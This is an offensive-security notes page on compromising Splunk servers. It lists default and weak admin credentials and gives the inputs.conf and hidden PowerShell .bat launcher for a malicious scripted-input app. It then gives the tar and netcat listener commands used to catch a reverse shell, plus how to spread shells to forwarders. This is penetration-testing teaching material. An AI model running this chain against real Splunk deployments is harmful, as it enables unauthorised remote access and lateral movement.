# Splunk

{% hint style="info" %}
A log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised.
{% endhint %}

## Discovery <a href="#splunk-discovery-enumeration" id="splunk-discovery-enumeration"></a>

* The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.
* The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme` .
* It is worth checking for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`
* We can discover Splunk with a quick Nmap service scan. We can see that Nmap identified the `Splunkd httpd` service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.

## Enumeration <a href="#splunk-discovery-enumeration" id="splunk-discovery-enumeration"></a>

* Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts.
* A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk.
* As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch or Python scripts.

## Expoitation

### Abusing Built-In Functionality <a href="#abusing-built-in-functionality" id="abusing-built-in-functionality"></a>

* We can use [Splunk package](https://github.com/0xjpuff/reverse_shell_splunk) to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1) and the default directory will have our `inputs.conf` file.
* The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds.
* <pre><code><strong>Save as inputs.conf 
  </strong>
  [script://./bin/rev.py]
  disabled = 0  
  interval = 10  
  sourcetype = shell 

  [script://.\bin\run.bat]
  disabled = 0
  sourcetype = shell
  interval = 10
  </code></pre>
* We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.
  * ```bat
    @ECHO OFF
    PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
    Exit
    ```
* Once the files are created or used from the above repo, we can create a tarball or `.spl` file.
  * `tar -cvzf updater.tar.gz splunk_shell/`&#x20;
* Choose `Install app from file` and upload the application.
* `sudo nc -lnvp 443`  <sup><sub>(start a listener on attacker machine)<sub></sup>
* On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`.
* As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.
* If we were dealing with a Linux host, we would need to edit the `rev.py` Python script.The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener.
* To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
